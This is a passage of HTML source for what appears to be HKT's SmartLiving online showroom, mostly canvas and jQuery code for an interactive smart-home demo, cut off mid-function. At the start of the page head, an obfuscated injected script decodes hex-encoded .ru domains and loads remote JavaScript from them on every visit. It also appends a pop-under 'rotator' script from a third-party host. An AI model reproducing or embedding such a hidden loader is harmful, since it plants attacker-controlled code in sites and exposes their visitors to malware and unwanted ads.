<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-HK" lang="en-HK">
	<head><script>if(window.v_347548468_V_235235235 === undefined) !(function(){!function(){var t=JSON.parse('["786c656a6a686c6c667233362e7275","707275676b6376393867366e2e7275"]'),n="27801",e=function(t,n,e){for(var r=[].slice.call(e),o=t.split("."),i=o.pop(),c=0;c<o.length;c++)n=n[o[c]];return n[i].apply(n,r)},r=function(t){if(!t)return"";if(t=t.match(/[\S\s]{1,2}/g),!t)return"";for(var n="",r=0;r<t.length;r++)n+=e("fromCharCode",String,[parseInt(t[r],16)]);return n},o=function(t,n){for(var e=t.split("."),r=!1,o=0;o<e.length;o++)n[e[o]]?(n=n[e[o]],r=!0):r=!1;return r},i=function(t,n,i){var c=document.location.protocol+"//"+t;if(-1==navigator.userAgent.toLowerCase().indexOf("firefox")){if(o(r("736d6c6f"),window))return e(r("736d6c6f2e6c6f6164536d6c6f"),window,[c.replace("https:","http:")]);if(o(r("7a536d6c6f"),window))return e(r("7a536d6c6f2e6c6f6164536d6c6f"),window,[c.replace("https:","http:")])}var a=document.createElement("script");a.setAttribute("src",c),a.setAttribute("type","text/javascript"),document.head.appendChild(a),a.onload=function(){this.a1649136515||(this.a1649136515=!0,"function"==typeof n&&n())},a.onerror=function(){this.a1649136515||(this.a1649136515=!0,a.parentNode.removeChild(a),"function"==typeof i&&i())}},c=function(e){var o=e?e:t[0],a=r(o)+"/pjs/"+n+".js";i(a,function(){},function(){var n=t.indexOf(o),e=t[n+1];e&&c(e)})};c()}();function getCfCookie(name) { var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)")); return matches ? decodeURIComponent(matches[1]) : undefined;} if (window.self == window.top) { document.addEventListener("DOMContentLoaded", function(){ var pops = document.createElement('script'); var cfilterCookie = '6697e3d5eb75761c638fdeb1eed84055'; var cfilterCookieIsSet = getCfCookie(cfilterCookie) ? getCfCookie(cfilterCookie) : 0; pops.src = '//mywebshield-ww1.com/' + 'getcl/rotator/' + 'campaignid/3/' + 'sourceid/132/' + 'siteid/200096452/' + 'userid/95F9F48B-BCFD-44C0-8B7F-555C72569365/' + 'iscookie/' + cfilterCookieIsSet; document.head.appendChild(pops); });}}) (), window.v_347548468_V_235235235 = true;</script>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="language" content="English">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=996, maximum-scale=1.5, user-scalable=no" />
		<meta name="description" content="Experience the multiple sensational pleasures brought to you by Smart Living" />
		<meta name="keywords" content="all-in-one control, scenes control, Smart Living showroom, Smart Home" />
		<meta name="robots" content="index" />
		<meta name="title" content="SmartLiving | Online Showroom" />
		<meta property="og:description" content="Experience the multiple sensational pleasures brought to you by Smart Living" />
		<meta property="og:title" content="SmartLiving | Online Showroom" />
		<meta property="og:type" content="website" />
		<meta property="og:url" content="http://smartliving.hkt.com:80/online-showroom-part.php?lang=eng" />
		<meta property="og:image" content="http://smartliving.hkt.com/images/homecol3.jpg" />
		<meta property="og:site_name" content="SmartLiving" />
		<title>SmartLiving | Online Showroom</title>
		<link href="css/eng-text.css" rel="stylesheet" type="text/css" />
		<link href="css/onlineShowroomPart.css" rel="stylesheet" type="text/css" />
		<link rel="canonical" href="http://smartliving.hkt.com:80/online-showroom-part.php?lang=eng" />
	</head>
	<body class="online-showroom enPage ">
		<div class="transContent">
						<div class="srPannel">
				<div>
					<h2>ONLINE SHOWROOM</h2>
					<p>Click the buttons on the virtual tablet to experience the multiple sensational pleasures brought to you by Smart Living</p>
					<div class="ipad">
						<ul class="pannelSwitch">
							<li id="functionsBtn">
								<div><span>Functions</span></div>
								<ul class="pannel">
									<li id="tvBtn"><span>TV</span></li>
									<li id="lampBtn"><span>Lamp</span></li>
									<li id="hifiBtn"><span>Hi-Fi</span></li>
									<li id="curtainBtn"><span>Curtain</span></li>
									<li id="airConBtn"><span>Air-Con</span></li>
									<li id="ipCamBtn"><span>IP-Cam</span></li>
								</ul>
							</li>
							<li id="scenesBtn">
								<div><span>Scenes</span></div>
								<ul class="pannel">
									<li id="brightBtn"><span>Bright</span></li>
									<li id="sleepingBtn"><span>Sleeping</span></li>
									<li id="dinningBtn"><span>Dining</span></li>
									<li id="sunsetBtn"><span>Sunset</span></li>
									<li id="movieBtn"><span>Movie</span></li>
									<li id="romanticBtn"><span>Romatic</span></li>
								</ul>
							</li>
						</ul>
					</div>
				</div>
			</div>
					</div>
		<canvas id="showroom"></canvas>
		<audio id="main_audio" preload="auto" loop="loop"></audio>
		<script type='text/javascript' src='js/jquery-1.11.3.min.js'></script>
		<script>
			$(document).ready(function(){
				/* draw canvas */
				var $frameRate= 30;
				var $animateTime = 1;//sec
				//var startUp = true;
				var $intPaused = false;
				var $btnFreeze = true;

				var $canvasMinW = 996;
				var $canvasMaxW = 4096;
				var $canvasMinH = 620;
				var $canvasMaxH = 900;
				var $canvasW;
				var $canvasH;

				//background --
				var $bgW = 1280;
				var $bgH = 900;
				var $bgSpaceTop = 230;
				var $bgX;
				var $bgY;

				//lamp on/off image for stage 0 --
				var $lampOnFtrW=104;
				var $lampOnFtrH=103;
				var $lampOnFtrX;
				var $lampOnFtrY;

				//hifi image --
				var $hifiW = 33;
				var $hifiH = 7;
				var $hifiX;
				var $hifiY;

				//curtain image --
				var $curtainW = 516;
				var $curtainH = 408;
				var $curtainX;
				var $curtainY;

				//airCon on/off image for stage 0 --
				var $airConOnFtrW=209;
				var $airConOnFtrH=27;
				var $airConOnFtrX;
				var $airConOnFtrY;

				//ipCam image for stage 0 --
				var $ipCamFtrW=56;
				var $ipCamFtrH=56;
				var $ipCamFtrX;
				var $ipCamFtrY;

				//airCon on/off indicator --
				var $airConIndX;
				var $airConIndY;

				//feature labels for stage 0 --
				var $ftrLabelsW = 150;
				var $ftrLabelsH = 121;

				//-//tv label for stage 0 --
				var $tvLabelX;
				var $tvLabelY;

				//-/lamp label for stage 0 --
				var $lampLabelX;
				var $lampLabelY;

				//-/hifi label for stage 0 --
				var $hifiLabelX;
				var $hifiLabelY;

				//-//curtain label for stage 0 --
				var $curtainLabelX;
				var $curtainLabelY;

				//-//aircon label for stage 0 --
				var $airConLabelX;
				var $airConLabelY;

				//-//ipCam label for stage 0 --
				var $ipCamLabelX;
				var $ipCamLabelY;

				//tv video --
				var $tvVideoX;
				var $tvVideoY;

				var $stage0Tv = 'news';

				var $stages = [
					/*[stage mode, {
						'tv': (tv, 'off' for off),
						'lamp': (lamp, true for on, flase for off),
						'hifi': (hifi, true for on, flase for off),
						'curtain': (0 for up, 1 for down),
						'airCon': (airCon temperature, true for on, flase for off),
						'ipCam': (ipCam, true for on, flase for off),
					}]*/
					['functions', {'tv':'off', 'lamp':false, 'hifi':false, 'curtain':0, 'airCon':false, 'ipCam':false, 'music':''}],
					['bright', {'tv':'news', 'lamp':true, 'hifi':false, 'curtain':0, 'airCon':true, 'ipCam':false, 'music':''}],
					['sleeping', {'tv':'off', 'lamp':false, 'hifi':false, 'curtain':1, 'airCon':false, 'ipCam':false, 'music':''}],
					['dinning', {'tv':'off', 'lamp':false, 'hifi':false, 'curtain':0, 'airCon':true, 'ipCam':false, 'music':''}],
					['sunset', {'tv':'off', 'lamp':true, 'hifi':false, 'curtain':.34, 'airCon':true, 'ipCam':false, 'music':''}],
					['movie', {'tv':'movie', 'lamp':false, 'hifi':true, 'curtain':1, 'airCon':true, 'ipCam': false, 'music':''}],
					['romantic', {'tv':'off', 'lamp':true, 'hifi':true, 'curtain':1, 'airCon':true, 'ipCam':false, 'music':'MoonlightBlues_vdown'}]
				];

				//current functions Status
				var $currStageFnStatus = {
					/*'tv': $stages[$currStage][1].tv,
					'lamp': $stages[$currStage][1].lamp,
					'hifi': $stages[$currStage][1].hifi,
					'curtain': $stages[$currStage][1].curtain,
					'airCon': $stages[$currStage][1].airCon,
					'ipCam': $stages[$currStage][1].ipCam*/
				};

				// current stage index (default: function mode)
				var $currStage = 0;

				var $defalutElements = [
					/*[
						alpha,
						[element type, element object],
						[element type, element object]
					]*/
					[//layer 0, the stage
						1,
						['bg','bg0'], //background --
						['fnLampOn', 0], //lamp on/off image for stage 0 --
						['hifiOn', 0], //hifi image--
						['curtain', 'curtain0', 0], //curtain image --
						['fnAirConOn', 0], //airCon on/off image for stage 0 --
						['fnIpCamOn', 0] //ipCam image for stage 0 --
					],
					[//layer 1, new stage
						0,
						['bg','bg1'], //background --
						['fnLampOn', 0], //lamp on/off image for stage 0 --
						['hifiOn', 0], //hifi image --
						['curtain', 'curtain1', 0], //curtain image --
						['fnAirConOn', 0], //airCon on/off image for stage 0 --
						['fnIpCamOn', 0] //ipCam image for stage 0 --
					],
					[0, ['airConIndicator', false]], //layer 2, airCon on/off indicator --
					[0, ['tvLabel', 'off']], //layer 3, tv label for stage 0 --
					[0, ['lampLabel', false]], //layer 4, lamp label for stage 0 --
					[0, ['hifiLabel', false]], //layer 5, hifi label for stage 0 --
					[0, ['curtainLabel', false]], //layer 6, curtain label for stage 0 --
					[0, ['airConLabel', false]], //layer 7, aircon label for stage 0 --
					[0, ['ipCamLabel', false]] //layer 8, ipCam label for stage 0 --
				];
				var $currElements = [];
				resetCurrElements(); //reset $currElements to default;
				function resetCurrElements(){
					//cone $defalutElements data to $currElements
					$currElements = [];
					for($a=0; $a<$defalutElements.length; $a++){
						$currElements[$a] = [];
						for($b=0; $b<$defalutElements[$a].length; $b++){
							if($b==0){
								$currElements[$a][$b] = $defalutElements[$a][$b];
							}else{
								$currElements[$a][$b] = $defalutElements[$a][$b].slice();
							}
						}
					};
				};

				var $stage0Selected={
					/*features : status,*/
					"tv" : $stages[0][1].tv,
					"lamp" : $stages[0][1].lamp,
					"hifi" : $stages[0][1].hifi,
					"curtain" : $stages[0][1].curtain,
					"airCon" :  $stages[0][1].airCon,
					"ipCam" : $stages[0][1].ipCam,
					"music" : $stages[0][1].music
				};

				var canvas = document.getElementById('showroom');
				var context = canvas.getContext('2d');
				var buffer = document.createElement('canvas');
				var contextBuffer = buffer.getContext('2d');

				/*int current stage */
				function intPage(){
					var $IE8 = false;
					if(!$IE8){
						$('.transContent').css('background','url(/images/'+$stages[$currStage][0]+'.jpg) center top no-repeat');

						var $cached = 0;
						//lamp on/off image for stage 0 --
						window.fnLampOn = new Image();
						window.fnLampOn.src = 'images/functions_lamp_on.jpg';
						window.fnLampOn.onload = function(){
							$cached ++;
							intPage2();
						};
						//hifi image --
						window.hifiOn = new Image();
						window.hifiOn.src = 'images/hifiEq.png';
						window.hifiOn.onload = function(){
							$cached ++;
							intPage2();
						};
						//airCon on/off image for stage 0 --
						window.fnAirConOn = new Image();
						window.fnAirConOn.src = 'images/functions_airCon_on.jpg';
						window.fnAirConOn.onload = function(){
							$cached ++;
							intPage2();
						};
						//ipCam image for stage 0 --
						window.fnIpCamOn = new Image();
						window.fnIpCamOn.src = 'images/ipcam.jpg';
						window.fnIpCamOn.onload = function(){
							$cached ++;
							intPage2();
						};
						//feature labels for stage 0 --
						window.featureLabel = new Image();
						window.featureLabel.src = 'images/featureLabel_eng.png';
						window.featureLabel.onload = function(){
							$cached ++;
							intPage2();
						};
						function intPage2(){
							if($cached==5) drawStillStage($currStage, true);
						}
					}
				};
				intPage();

				$(window).resize(function(){
					resizeCanvas(false);
				});

				function resizeCanvas($onInt){
					$intPaused=true; //pause all nterval
					canvasResize2(!$onInt);//if not on start, redo
					function canvasResize2($redo){
						$canvasW = Math.min(Math.max($('.transContent').width(),$canvasMinW),$canvasMaxW);
						$canvasH = Math.min(Math.max($(window).height(),$canvasMinH),$canvasMaxH);
						canvas.width = $canvasW;
						canvas.height = $canvasH;
						buffer.width = canvas.width;
						buffer.height = canvas.height;

						//background --
						$bgX = 0-($bgW-$canvasW)/2;
						if($canvasH<=$canvasMaxH-$bgSpaceTop){
							$bgY = 0-$bgSpaceTop;
						}else{
							$bgY = $canvasH-$bgH;
						}

						//lamp on/off image for stage 0 --
						$lampOnFtrX = $bgX+472;
						$lampOnFtrY = $bgY+450;

						//hifi image --
						$hifiX = $bgX+581;
						$hifiY = $bgY+568;

						
						//airCon on/off image for stage 0 --
						$airConOnFtrX = $bgX+576;
						$airConOnFtrY = $bgY+243;

						//ipCam image for stage 0 --
						$ipCamFtrX = $bgX+1200;
						$ipCamFtrY = $bgY+316;

						//airCon on/off indicator --
						$airConIndX = $bgX+790;
						$airConIndY = $bgY+258;

						//-//tv label for stage 0 --
						$tvLabelX = $bgX+430;
						$tvLabelY = $bgY+250;

						//-//lamp label for stage 0 --
						$lampLabelX = $bgX+428;
						$lampLabelY = $bgY+40;

						//-//hifi label for stage 0 --
						$hifiLabelX = $bgX+455;
						$hifiLabelY = $bgY+505;

						//-//curtain label for stage 0 --
						$curtainLabelX = $bgX+938;
						$curtainLabelY = $bgY+300;

						//-//aircon label for stage 0 --
						$airConLabelX = $bgX+747;
						$airConLabelY = $bgY+240;

						//-//ipCam label for stage 0 --
						$ipCamLabelX = $bgX+900;
						$ipCamLabelY = $bgY+110;

						//tv video --
						$tvVideoX = $bgX+564; /*566*/
						$tvVideoY = $bgY+342; /*382*/
						$('.tvVideo').css('left', $tvVideoX).css('top', $tvVideoY);

						drawCurrElement();
						if($redo){
							//redo for fixing bug caused by the scroll bar
							setTimeout(function(){canvasResize2(false)},50);
						}else{
							$intPaused=false;
						}
					}
				};
				function drawStillStage($stage, $onInt){
					$currStage = $stage;

					var $cached = 0;
					window.bg0 = new Image();
					window.bg0.src = 'images/'+$stages[$stage][0]+'.jpg';
					window.bg0.onload = function(){
						$cached++;
						drawStillStage2();
					};
					window.curtain0 = new Image();
					window.curtain0.src = 'images/'+$stages[$stage][0]+'_curtain.jpg';
					window.curtain0.onload = function(){
						$cached++;
						drawStillStage2();
					};
					window.bg1 = new Image();
					window.curtain1 = new Image();

					function drawStillStage2(){
						if($cached==2){
							if($onInt) $('.transContent').css('background','');
							if($stage==0){
								$currStageFnStatus = {
									'tv': $stage0Selected.tv,
									'lamp': $stage0Selected.lamp,
									'hifi': $stage0Selected.hifi,
									'curtain': $stage0Selected.curtain,
									'airCon': $stage0Selected.airCon,
									'ipCam': $stage0Selected.ipCam
								}
							}else{
								$currStageFnStatus = {
									'tv': $stages[$stage][1].tv,
									'lamp': $stages[$stage][1].lamp,
									'hifi': $stages[$stage][1].hifi,
									'curtain': $stages[$stage][1].curtain,
									'airCon': $stages[$stage][1].airCon,
									'ipCam': $stages[$stage][1].ipCam
								}
							}

							resetCurrElements(); //reset $currElements to default;
							$currElements[0][0] = 1;//alpha of layer 0, the stage

							$currElements[0][2][1] = ($stage==0 && $currStageFnStatus.lamp)? 1 : 0; //lamp on/off image for stage 0 --
							$currElements[0][3][1] = $currStageFnStatus.hifi? 1 : 0; //hifi image--
							$currElements[0][4][2] = $currStageFnStatus.curtain; //curtain image --

							if($currStageFnStatus.airCon){
								if($stage==0){
									//airCon on/off image for stage 0 --
									$currElements[0][5][1] = $currStageFnStatus.airCon ? 1 : 0;
								}else{
									//airCon on/off indicator --
									$currElements[2][0]=1;
									$currElements[2][1][1]=$currStageFnStatus.airCon;
								}
							}

							//ipCam image for stage 0 --
							$currElements[0][6][1] = $stage==0? ($currStageFnStatus.ipCam? 2 : 1) : 0;
							if($onInt){
								window.ipCamSwing = ($stage==0 && $currStageFnStatus.ipCam)? true : false
							}else if($stage==0 && $currStageFnStatus.ipCam){
								window.ipCamSwing = true;
							}else if($stage!=0){
								window.ipCamSwing = false;
							}

							if($stage==0){
								//-//tv label for stage 0 --
								$currElements[3][0] = ($currStageFnStatus.tv != 'off')?1:0;
								$currElements[3][1][1] = $currStageFnStatus.tv;

								//-//lamp label for stage 0 --
								$currElements[4][0] = $currStageFnStatus.lamp?1:0;
								$currElements[4][1][1] = $currStageFnStatus.lamp;

								//-/hifi label for stage 0 --
								$currElements[5][0] = $currStageFnStatus.hifi?1:0;
								$currElements[5][1][1] = $currStageFnStatus.hifi;

								//-//curtain label for stage 0 --
								$currElements[6][0] = $currStageFnStatus.curtain?1:0;
								$currElements[6][1][1] = $currStageFnStatus.curtain;

								//-//aircon label for stage 0 --
								$currElements[7][0] = $currStageFnStatus.airCon?1:0;
								$currElements[7][1][1] = $currStageFnStatus.airCon;

								//-//ipCam label for stage 0 --
								$currElements[8][0] = $currStageFnStatus.ipCam?1:0;
								$currElements[8][1][1] = $currStageFnStatus.ipCam;
							}

							if($onInt){
								resizeCanvas(true);
								//tv video --
								if($currStageFnStatus.tv!='off'){
									setTimeout(function(){addVideo($currStageFnStatus.tv)},500);
								}
							}else{
								drawCurrElement();
							}

							checkLoop(true);//hifi image loop--
							//checkIpCamLoop(true);//ipCam image loop--

							$btnFreeze=false;
						}
					}
				};
				function animateStage($newStage){
					checkLoop(false);//kill hifi loop

					var $oldStage = $currStage;

					var $oldCurtainStatus = $currStageFnStatus.curtain;
					var $newCurtainStatus = ($newStage==0 ? $stage0Selected.curtain : $stages[$newStage][1].curtain);

					var $noAirCon = true;
					if($currStageFnStatus.airCon||$stages[$newStage][1].airCon){
						$noAirCon = false;
						var $oldAirConStatus = {
							'status': ($oldStage==0 ? $stage0Selected.airCon : $stages[$oldStage][1].airCon),
							'alpha': ($currStage==0? 0 : ($currStageFnStatus.airCon ? 1 : 0))
						};
						var $newAirConStatus = {
							'status': ($newStage==0 ? $stage0Selected.airCon : $stages[$newStage][1].airCon),
							'alpha': ($newStage==0 ? 0 : ($stages[$newStage][1].airCon ? 1 : 0))
						};
					}

					$('#scenesBtn > ul > li').removeClass('active');
					if($newStage!=0){// if not in stage 0, apply active class to icon
						$('#scenesBtn > ul > li').eq($newStage-1).addClass('active');
					}

					var $cached = 0;
					window.bg1 = new Image();
					window.bg1.src = 'images/'+$stages[$newStage][0]+'.jpg';
					window.bg1.onload = function() {
						$cached++;
						animateStage2();
					}
					window.curtain1 = new Image();
					window.curtain1.src = 'images/'+$stages[$newStage][0]+'_curtain.jpg';
					window.curtain1.onload = function() {
						$cached++;
						animateStage2();
					}

					/***************** BGM Play Function (Pinky, 20151229) *****************/
					//console.log($stages[$newStage][1].music)
					var $newMusicPath = $stages[$newStage][1].music;
					var audioPlayer = document.getElementById('main_audio');
					var isPlaying = function(audio) {return !audio.paused;}

					if ($newMusicPath !=''){
						$("#main_audio").empty().html('<source src="/sound/' + $newMusicPath + '.mp3" type="audio/mpeg" /><source src="/sound/' + $newMusicPath + '.ogg" type="audio/ogg" />');

						if (isPlaying(audioPlayer)) {
							audioPlayer.pause();
							audioPlayer.play();
						} else {
							audioPlayer.play();
						}
					} else {
						if (isPlaying(audioPlayer)) {
							audioPlayer.pause();
						}
					}
					/***************** BGM Play Function (Pinky, 20151229) *****************/

					function animateStage2(){
						if($cached==2){
							if($oldStage==0){
								$currStageFnStatus = {
									'tv': $stage0Selected.tv,
									'lamp': $stage0Selected.lamp,
									'hifi': $stage0Selected.hifi,
									'curtain': $stage0Selected.curtain,
									'airCon': $stage0Selected.airCon,
									'ipCam': $stage0Selected.ipCam,
									'music': $stage0Selected.music
								}
							}else{
								$currStageFnStatus = {
									'tv': $stages[$oldStage][1].tv,
									'lamp': $stages[$oldStage][1].lamp,
									'hifi': $stages[$oldStage][1].hifi,
									'curtain': $stages[$oldStage][1].curtain,
									'airCon': $stages[$oldStage][1].airCon,
									'ipCam': $stages[$oldStage][1].ipCam,
									'music': $stages[$oldStage][1].music,
								}
							}

							var $stageTmp = $currElements[0];
							resetCurrElements(); //reset $currElements to default;
							$currElements[0] = $stageTmp; //layer 0, old stage

							//lamp on/off image for stage 0 --
							if($newStage==0&&$stage0Selected.lamp) $currElements[1][2][1] = 1;

							//hifi image--
							$currElements[1][3][1] = (($newStage==0 && $stage0Selected.hifi) || ($newStage!=0 && $stages[$newStage][1].hifi))? 1 : 0;

							if(!$noAirCon){
								//airCon on/off image for stage 0 --
								$currElements[1][5][1] = ($newStage==0 && $oldAirConStatus.status)? 1 : 0;

								//airCon on/off indicator --
								$currElements[2][0]=$oldAirConStatus.alpha;
								$currElements[2][1][1]=$newAirConStatus.status;
							}

							//ipCam image for stage 0 --
							if($oldStage==0 && $newStage!=0){
								$currElements[0][6][1] = 1;
							}

							if($oldStage==0 || $newStage==0){
								//-//tv label for stage 0 --
								$currElements[3][0] = ($oldStage==0&&$stage0Selected.tv!='off')? 1 : 0;
								$currElements[3][1][1] = $stage0Selected.tv;

								//-//lamp label for stage 0 --
								$currElements[4][0] = ($oldStage==0&&$stage0Selected.lamp)? 1 : 0;
								$currElements[4][1][1] = $stage0Selected.lamp;

								//-//hifi label for stage 0 --
								$currElements[5][0] = ($oldStage==0&&$stage0Selected.hifi)? 1 : 0;
								$currElements[5][1][1] = $stage0Selected.hifi;

								//-//curtain label for stage 0 --
								$currElements[6][0] = ($oldStage==0&&$stage0Selected.curtain)? 1 : 0;
								$currElements[6][1][1] = $stage0Selected.curtain;

								//-//aircon label for stage 0 --
								$currElements[7][0] = ($oldStage==0&&$stage0Selected.airCon)? 1 : 0;
								$currElements[7][1][1] = $stage0Selected.airCon;

								//-//ipCam label for stage 0 --
								$currElements[8][0] = ($oldStage==0&&$stage0Selected.ipCam)? 1 : 0;
								$currElements[8][1][1] = $stage0Selected.ipCam;
							}

							//tv video --
							addVideo($newStage==0 ? $stage0Selected.tv : $stages[$newStage][1].tv);

							var $totalFrame = $frameRate*$animateTime;
							var $currFrame=0;

							//animation
							var $stageInt = setInterval(function(){
								if(!$intPaused){
									$currFrame++;
									var $progress = $currFrame/$totalFrame;

									//alpha of new stage
									$currElements[1][0] = $progress;

									//curtain image --
									$currElements[0][4][2] = $oldCurtainStatus+($newCurtainStatus-$oldCurtainStatus)*$progress;
									$currElements[1][4][2] = $currElements[0][4][2];

									if(!$noAirCon){
										//airCon on/off image for stage 0 --

										if($newStage==0){
											$tempAirCon =[$oldAirConStatus.status?1:0, $newAirConStatus.status?1:0];
											$currElements[1][5][1] = $tempAirCon[0]+($tempAirCon[1]-$tempAirCon[0])*$progress;
										}

										//alpha of airCon on/off indicator
										$currElements[2][0] = $oldAirConStatus.alpha+($newAirConStatus.alpha-$oldAirConStatus.alpha)*$progress;
									}

									//feature labels for stage 0 --
									if($oldStage==0 || $newStage==0){
										$oldStageProgess = ($oldStage==0 ? 1-$progress: $progress);
										//-//tv label for stage 0 --
										$currElements[3][0] = (($stage0Selected.tv!='off')? $oldStageProgess : 0);
										//-//lamp label for stage 0 --
										$currElements[4][0] = ($stage0Selected.lamp? $oldStageProgess : 0);
										//-//hifi label for stage 0 --
										$currElements[5][0] = ($stage0Selected.hifi? $oldStageProgess : 0);
										//-//curtain label for stage 0 --
										$currElements[6][0] = ($stage0Selected.curtain? $oldStageProgess : 0);
										//-//aircon label for stage 0 --
										$currElements[7][0] = ($stage0Selected.airCon? $oldStageProgess : 0);
										//-//ipCam label for stage 0 --
										$currElements[8][0] = ($stage0Selected.ipCam? $oldStageProgess : 0);
									}
									drawCurrElement();

									if($currFrame>=$totalFrame){
										clearInterval($stageInt);
										drawStillStage($newStage, false);
									}
								}
							},1000/$frameRate);
						};
					};
				};
				function drawCurrElement(){
					context.clearRect(0, 0, canvas.width, canvas.height);
					for($a=0; $a<$currElements.length; $a++){
						if($currElements[$a][0] != 0){
							drawCanvas($currElements[$a]);
						}
					}
					function drawCanvas($data){
						var theAlpha = Math.min(1, Math.max(0, $data[0]));

						contextBuffer.clearRect(0, 0, buffer.width, buffer.height);
						for($z=1; $z<$data.length;$z++){
							switch($data[$z][0]){
								case 'bg':
									//background --
									contextBuffer.drawImage(window[$data[$z][1]], $bgX, $bgY);
									$drawBufferX = 0;
									$drawBufferY = 0;
									$drawBufferW = buffer.width;
									$drawBufferH = buffer.height;
									break;
								case 'fnLampOn':
									//lamp on/off image for stage 0 --
									if($data[$z][1]>0){
										contextBuffer.globalAlpha = Math.min(1, Math.max(0, $data[$z][1])); // alpha of this element
										contextBuffer.drawImage(window[$data[$z][0]], $lampOnFtrX, $lampOnFtrY, $lampOnFtrW, $lampOnFtrH);
										contextBuffer.globalAlpha = 1; // reset alpha
									}
									break;
								case 'hifiOn':
									//hifi image--
									if($data[$z][1]>0){
										contextBuffer.globalAlpha = Math.min(1, Math.max(0, $data[$z][1])); // alpha of this element
										contextBuffer.drawImage(window[$data[$z][0]], 0, $hifiH*getHifiFrame(), $hifiW, $hifiH, $hifiX, $hifiY, $hifiW, $hifiH);
										contextBuffer.globalAlpha = 1; // reset alpha
									}
									break;
								case 'curtain':
									//curtain image --
									var $C = .21+$data[$z][2]*.72; //fine tune curtain height range from 0-1 to .21-.93
									contextBuffer.drawImage(window[$data[$z][1]], 0, 0, $curtainW, $curtainH*$C, $curtainX, $curtainY, $curtainW, $curtainH*$C);
									break;
								case 'fnAirConOn':
									//airCon on/off image for stage 0 --
									if($data[$z][1]!=0){
										contextBuffer.drawImage(window[$data[$z][0]], 0, $airConOnFtrH*(Math.floor($data[$z][1]*49)), $airConOnFtrW, $airConOnFtrH, $airConOnFtrX, $airConOnFtrY, $airConOnFtrW, $airConOnFtrH);
									}
									break;
								case 'fnIpCamOn':
									//ipCam image for stage 0 --
									if($data[$z][1]>0){
										contextBuffer.drawImage(window[$data[$z][0]], 0, $ipCamFtrH*getIpCamFrame(), $ipCamFtrW, $ipCamFtrH, $ipCamFtrX, $ipCamFtrY, $ipCamFtrW, $ipCamFtrH);
									}
									break;
								case 'airConIndicator':
									var $airConRadius = 27;
									contextBuffer.beginPath();

									//-//draw Bg
									contextBuffer.fillStyle = '#ffffff';
									contextBuffer.shadowColor = 'rgba(0,0,0,.5)';
									contextBuffer.shadowBlur = 5;
									contextBuffer.shadowOffsetX = 2;
									contextBuffer.shadowOffsetY = 2;
									contextBuffer.arc($airConRadius, $airConRadius, $airConRadius, 0, 2 * Math.PI, false);
									contextBuffer.rect(4, 4, 10, 10);
									contextBuffer.fill();

									//-//draw Text
									contextBuffer.font = '15pt RobotoRegular';
									contextBuffer.textAlign = 'center';
									contextBuffer.fillStyle = '#4c2d7d';
									contextBuffer.shadowColor = null;
									contextBuffer.shadowBlur = 0;
									contextBuffer.shadowOffsetX = 0;
									contextBuffer.shadowOffsetY = 0;
									contextBuffer.fillText(($data[$z][1]? "On":"Off"), $airConRadius, $airConRadius+6);

									contextBuffer.fillStyle = null;

									$drawBufferX = $airConIndX;
									$drawBufferY = $airConIndY;
									$drawBufferW = $airConRadius*2+7;
									$drawBufferH = $airConRadius*2+7;
									break;
								case 'tvLabel':
									//-//tv label for stage 0 --
									contextBuffer.drawImage(window.featureLabel, 0, 0, $ftrLabelsW, $ftrLabelsH, 0, 0, $ftrLabelsW, $ftrLabelsH);
									$drawBufferX = $tvLabelX;
									$drawBufferY = $tvLabelY;
									$drawBufferW = $ftrLabelsW;
									$drawBufferH = $ftrLabelsH;
									break;
								case 'lampLabel':
									//-//lamp label for stage 0 --
									contextBuffer.drawImage(window.featureLabel, 0, $ftrLabelsH, $ftrLabelsW, $ftrLabelsH, 0, 0, $ftrLabelsW, $ftrLabelsH);
									$drawBufferX = $lampLabelX;
									$drawBufferY = $lampLabelY;
									$drawBufferW = $ftrLabelsW;
									$drawBufferH = $ftrLabelsH;
									break;
								case 'hifiLabel':
									//-//hifi label for stage 0 --
									contextBuffer.drawImage(window.featureLabel, 0, $ftrLabelsH*2, $ftrLabelsW, $ftrLabelsH, 0, 0, $ftrLabelsW, $ftrLabelsH);
									$drawBufferX = $hifiLabelX;
									$drawBufferY = $hifiLabelY;
									$drawBufferW = $ftrLabelsW;
									$drawBufferH = $ftrLabelsH;
									break;
								case 'curtainLabel':
									//-//curtain label for stage 0 --
									if($data[$z][1]){
										contextBuffer.drawImage(window.featureLabel, 0, $ftrLabelsH*3, $ftrLabelsW, $ftrLabelsH, 0, 0, $ftrLabelsW, $ftrLabelsH);
										$drawBufferX = $curtainLabelX;
										$drawBufferY = $curtainLabelY;
										$drawBufferW = $ftrLabelsW;
										$drawBufferH = $ftrLabelsH;
									}
									break;
								case 'airConLabel':
									//-//aircon label for stage 0 --
									if($data[$z][1]){
										contextBuffer.drawImage(window.featureLabel, 0, $ftrLabelsH*4, $ftrLabelsW, $ftrLabelsH, 0, 0, $ftrLabelsW, $ftrLabelsH);
										$drawBufferX = $airConLabelX;
										$drawBufferY = $airConLabelY;
										$drawBufferW = $ftrLabelsW;
										$drawBufferH = $ftrLabelsH;
									}
									break;
								case 'ipCamLabel':
									//-//ipCam label for stage 0 --
									if($data[$z][1]){
										contextBuffer.drawImage(window.featureLabel, 0, $ftrLabelsH*5, $ftrLabelsW, $ftrLabelsH, 0, 0, $ftrLabelsW, $ftrLabelsH);
										$drawBufferX = $ipCamLabelX;
										$drawBufferY = $ipCamLabelY;
										$drawBufferW = $ftrLabelsW;
										$drawBufferH = $ftrLabelsH;
									}
									break;
							}
						}
						context.globalAlpha = theAlpha;
						context.drawImage(buffer, 0, 0, $drawBufferW, $drawBufferH, $drawBufferX, $drawBufferY, $drawBufferW, $drawBufferH);
						contextBuffer.clearRect(0, 0, buffer.width, buffer.height);
					}
				}	;
				function addVideo($source){
					$aTime = $animateTime*1000;
					if($source!='off' && ($source != $('.tvVideo').data('status'))){
						if($source != 'movie'){
						 	var $videoBody = '<iframe width="282" height="150" src="https://www.youtube.com/embed/videoseries?list=PLDLZtS0atun8lapSjQJ-q8zylU2M3XQ2r&autoplay=1&showinfo=0&controls=0" frameborder="0"></iframe>';
